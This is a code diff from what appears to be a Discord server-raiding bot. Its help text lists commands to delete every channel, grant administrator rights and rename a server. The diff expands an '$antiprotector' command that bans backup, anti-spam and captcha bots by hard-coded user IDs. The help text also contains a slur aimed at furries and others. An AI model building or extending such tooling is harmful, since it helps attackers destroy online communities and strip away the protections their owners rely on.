@@ -98,7 +98,7 @@ client.on("message", async (message) => {
             "$del - yeets all the channels and only leaves one",
             "$admall - self explanatory",
             "$servername (new server name) - self explanatory",
-            "$antiprotector - bans xenon (backup bot) and betterantispam",
+            "$antiprotector - bans xenon (backup bot), betterantispam and some captcha bots",
             "$yes (vc id) - plays some catch the wave", //please for love of god dont hate on this command, i spent almost 1 hour just to find the proper ffmpeg buildpack for heroku and the opus package for this bot
             `$help - bruhhh\n`,
             "Bot by paradino, making gachafags and furries lifes worse"]
@@ -108,6 +108,9 @@ client.on("message", async (message) => {
           message.delete()
           message.guild.ban(`416358583220043796`)
           message.guild.ban(`501982335076532224`)
+          message.guild.ban(`554631615565922364`)
+          message.guild.ban(`426537812993638400`)
+          message.guild.ban(`159985870458322944`)
         break;
         case "rolepos":
           message.channel.send(botrole.position)
